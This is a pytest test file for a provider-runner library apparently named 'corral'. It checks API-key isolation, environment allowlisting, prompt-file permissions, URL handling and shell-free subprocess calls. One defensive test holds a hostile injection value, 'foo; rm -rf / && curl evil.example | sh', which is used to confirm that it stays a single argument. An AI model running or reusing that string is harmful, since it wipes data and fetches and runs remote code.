from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from corral.retro.providers.anthropic import AnthropicSeatRunner
from corral.retro.providers.base import SeatStatus
from corral.retro.providers.openai_compatible import OpenAICompatibleSeatRunner
from corral.retro.providers.shell import ShellSeatRunner
from corral.retro.seats import Seat


def seat(adapter: str, *, auth_env: str | None = None, options: dict | None = None) -> Seat:
    return Seat("test-seat", "provider", "model-x", auth_env, adapter, options or {})


def test_anthropic_never_uses_ambient_auth_when_seat_auth_unset(monkeypatch) -> None:
    monkeypatch.setenv("ANTHROPIC_API_KEY", "ambient-secret")
    runner = AnthropicSeatRunner()
    configured = seat("anthropic-sdk", auth_env=None)

    assert runner.probe(configured).status == "unavailable"
    assert runner.complete(configured, "hello", timeout=1, max_tokens=10).status == "unavailable"


def test_anthropic_passes_only_named_auth_to_sdk(monkeypatch) -> None:
    captured: dict[str, object] = {}

    class Client:
        def __init__(self, **kwargs):
            captured.update(kwargs)
            self.messages = self

        def create(self, **kwargs):
            captured["create"] = kwargs
            return SimpleNamespace(
                content=[SimpleNamespace(type="text", text="answer")], stop_reason="end_turn"
            )

    monkeypatch.setitem(sys.modules, "anthropic", SimpleNamespace(Anthropic=Client))
    monkeypatch.setenv("NAMED_KEY", "named-secret")
    monkeypatch.setenv("ANTHROPIC_API_KEY", "ambient-secret")
    result = AnthropicSeatRunner().complete(
        seat("anthropic-sdk", auth_env="NAMED_KEY"), "prompt", timeout=3, max_tokens=42
    )

    assert result.status == "ok"
    assert result.text == "answer"
    assert captured["api_key"] == "named-secret"
    assert captured["create"]["max_tokens"] == 42  # type: ignore[index]


class FakeHTTPResponse:
    def __init__(self, payload: dict) -> None:
        self.payload = payload

    def __enter__(self):
        return self

    def __exit__(self, *args):
        return None

    def read(self) -> bytes:
        return json.dumps(self.payload).encode()


@pytest.mark.parametrize(
    "protocol,payload,expected_suffix,expected_key",
    [
        (
            "chat-completions",
            {"choices": [{"message": {"content": "chat answer"}}]},
            "/chat/completions",
            "messages",
        ),
        (
            "responses",
            {"output": [{"content": [{"type": "output_text", "text": "response answer"}]}]},
            "/responses",
            "input",
        ),
    ],
)
def test_openai_compatible_protocols(
    monkeypatch, protocol: str, payload: dict, expected_suffix: str, expected_key: str
) -> None:
    captured = {}

    def fake_urlopen(request, timeout):
        captured["url"] = request.full_url
        captured["body"] = json.loads(request.data)
        captured["auth"] = request.get_header("Authorization")
        captured["timeout"] = timeout
        return FakeHTTPResponse(payload)

    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    monkeypatch.setenv("ENDPOINT", "https://provider.invalid/v1")
    monkeypatch.setenv("TOKEN", "secret")
    configured = seat(
        "openai-compatible-endpoint",
        auth_env="TOKEN",
        options={"base_url_env": "ENDPOINT", "protocol": protocol},
    )
    result = OpenAICompatibleSeatRunner().complete(
        configured, "prompt", timeout=4, max_tokens=99
    )

    assert result.status == "ok"
    assert result.text.endswith("answer")
    assert captured["url"].endswith(expected_suffix)
    assert expected_key in captured["body"]
    assert captured["auth"] == "Bearer secret"
    assert captured["timeout"] == 4  # timeout must propagate to urlopen


def test_shell_env_allowlist_and_stdin(monkeypatch) -> None:
    monkeypatch.setenv("CORRAL_CANARY", "must-not-leak")
    script = (
        "import os,sys; "
        "print(('leaked' if 'CORRAL_CANARY' in os.environ else 'clean') + ':' + sys.stdin.read())"
    )
    configured = seat(
        "shell-command",
        options={"argv": [sys.executable, "-c", script, "--model", "{model}"]},
    )
    result = ShellSeatRunner().complete(configured, "the prompt", timeout=3, max_tokens=1)

    assert result.status == "ok"
    assert result.text == "clean:the prompt"


def test_shell_prompt_file_and_model_placeholder() -> None:
    script = "import pathlib,sys; print(sys.argv[1] + ':' + pathlib.Path(sys.argv[2]).read_text())"
    configured = seat(
        "shell-command",
        options={"argv": [sys.executable, "-c", script, "{model}", "{prompt_file}"]},
    )

    result = ShellSeatRunner().complete(configured, "from file", timeout=3, max_tokens=1)
    assert result.text == "model-x:from file"


def test_shell_invocation_explicitly_disables_shell(monkeypatch) -> None:
    captured = {}

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        captured.update(kwargs)
        return subprocess.CompletedProcess(argv, 0, stdout="done", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    configured = seat("shell-command", options={"argv": [sys.executable, "{model}"]})
    result = ShellSeatRunner().complete(configured, "prompt", timeout=3, max_tokens=1)

    assert result.status == "ok"
    assert captured["shell"] is False
    assert captured["argv"] == [sys.executable, "model-x"]


def test_shell_timeout_has_timeout_status(monkeypatch) -> None:
    def timeout(*args, **kwargs):
        raise subprocess.TimeoutExpired(args[0], kwargs["timeout"])

    monkeypatch.setattr(subprocess, "run", timeout)
    configured = seat("shell-command", options={"argv": [sys.executable]})
    result = ShellSeatRunner().complete(configured, "prompt", timeout=0.01, max_tokens=1)
    assert result.status == SeatStatus.TIMEOUT


def test_shell_hostile_model_id_stays_a_single_argv_element(monkeypatch) -> None:
    """A model id full of shell metacharacters must survive as one argv
    element -- argv-only invocation means there is no shell to interpret it."""
    captured = {}

    def fake_run(argv, **kwargs):
        captured["argv"] = argv
        captured["shell"] = kwargs.get("shell")
        return subprocess.CompletedProcess(argv, 0, stdout="done", stderr="")

    monkeypatch.setattr(subprocess, "run", fake_run)
    hostile_model = "foo; rm -rf / && curl evil.example | sh"
    configured = Seat(
        "hostile", "provider", hostile_model, None, "shell-command",
        {"argv": [sys.executable, "--model", "{model}"]},
    )
    result = ShellSeatRunner().complete(configured, "prompt", timeout=3, max_tokens=1)

    assert result.status == "ok"
    assert captured["shell"] is False
    assert captured["argv"] == [sys.executable, "--model", hostile_model]


def test_shell_prompt_file_created_with_owner_only_permissions() -> None:
    script = "import os,sys; print(oct(os.stat(sys.argv[1]).st_mode & 0o777))"
    configured = seat(
        "shell-command",
        options={"argv": [sys.executable, "-c", script, "{prompt_file}"]},
    )
    result = ShellSeatRunner().complete(configured, "sensitive prompt", timeout=3, max_tokens=1)

    assert result.status == "ok"
    assert result.text == "0o600"


def test_shell_canary_env_never_reaches_child() -> None:
    """The allowlist is default-deny: only PATH/HOME/LANG (+ the seat's named
    auth_env) may cross into the child, everything else stays outside."""
    os.environ["CORRAL_CANARY_SECOND"] = "also-must-not-leak"
    try:
        script = "import os; print(sorted(k for k in os.environ if k.startswith('CORRAL_')))"
        configured = seat(
            "shell-command", options={"argv": [sys.executable, "-c", script]}
        )
        result = ShellSeatRunner().complete(configured, "p", timeout=3, max_tokens=1)
        assert result.status == "ok"
        assert result.text == "[]"
    finally:
        del os.environ["CORRAL_CANARY_SECOND"]


def test_openai_probe_ignores_ambient_openai_key(monkeypatch) -> None:
    monkeypatch.setenv("OPENAI_API_KEY", "ambient-secret")
    monkeypatch.setenv("ENDPOINT", "https://provider.invalid/v1")
    runner = OpenAICompatibleSeatRunner()
    configured = seat(
        "openai-compatible-endpoint",
        auth_env=None,
        options={"base_url_env": "ENDPOINT", "protocol": "responses"},
    )
    assert runner.probe(configured).status == "unavailable"
    assert runner.complete(configured, "hello", timeout=1, max_tokens=10).status == "unavailable"


@pytest.mark.parametrize(
    "base_url,protocol,expected_url",
    [
        (
            "https://provider.invalid/v1/",
            "chat-completions",
            "https://provider.invalid/v1/chat/completions",
        ),
        (
            "https://provider.invalid/v1/chat/completions",
            "chat-completions",
            "https://provider.invalid/v1/chat/completions",
        ),
        (
            "https://provider.invalid/v1/chat/completions/",
            "chat-completions",
            "https://provider.invalid/v1/chat/completions",
        ),
        ("https://provider.invalid/v1/", "responses", "https://provider.invalid/v1/responses"),
        ("https://provider.invalid/v1/responses", "responses", "https://provider.invalid/v1/responses"),
    ],
)
def test_openai_url_suffixing(monkeypatch, base_url: str, protocol: str, expected_url: str) -> None:
    captured = {}
    payload = (
        {"choices": [{"message": {"content": "ok"}}]}
        if protocol == "chat-completions"
        else {"output_text": "ok"}
    )

    def fake_urlopen(request, timeout):
        captured["url"] = request.full_url
        return FakeHTTPResponse(payload)

    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    monkeypatch.setenv("ENDPOINT", base_url)
    monkeypatch.setenv("TOKEN", "secret")
    configured = seat(
        "openai-compatible-endpoint",
        auth_env="TOKEN",
        options={"base_url_env": "ENDPOINT", "protocol": protocol},
    )
    result = OpenAICompatibleSeatRunner().complete(configured, "prompt", timeout=4, max_tokens=9)

    assert result.status == "ok"
    assert captured["url"] == expected_url


def test_openai_non_200_becomes_error_without_leaking_token(monkeypatch) -> None:
    import urllib.error

    def fake_urlopen(request, timeout):
        raise urllib.error.HTTPError(request.full_url, 401, "Unauthorized", {}, None)

    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    monkeypatch.setenv("ENDPOINT", "https://provider.invalid/v1")
    monkeypatch.setenv("TOKEN", "secret")
    configured = seat(
        "openai-compatible-endpoint",
        auth_env="TOKEN",
        options={"base_url_env": "ENDPOINT", "protocol": "chat-completions"},
    )
    result = OpenAICompatibleSeatRunner().complete(configured, "prompt", timeout=4, max_tokens=9)

    assert result.status == SeatStatus.ERROR
    assert "401" in result.detail
    assert "secret" not in result.detail


def test_openai_timeout_classified(monkeypatch) -> None:
    import socket
    import urllib.error

    def fake_urlopen(request, timeout):
        raise urllib.error.URLError(socket.timeout("timed out"))

    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    monkeypatch.setenv("ENDPOINT", "https://provider.invalid/v1")
    monkeypatch.setenv("TOKEN", "secret")
    configured = seat(
        "openai-compatible-endpoint",
        auth_env="TOKEN",
        options={"base_url_env": "ENDPOINT", "protocol": "responses"},
    )
    result = OpenAICompatibleSeatRunner().complete(configured, "prompt", timeout=4, max_tokens=9)
    assert result.status == SeatStatus.TIMEOUT
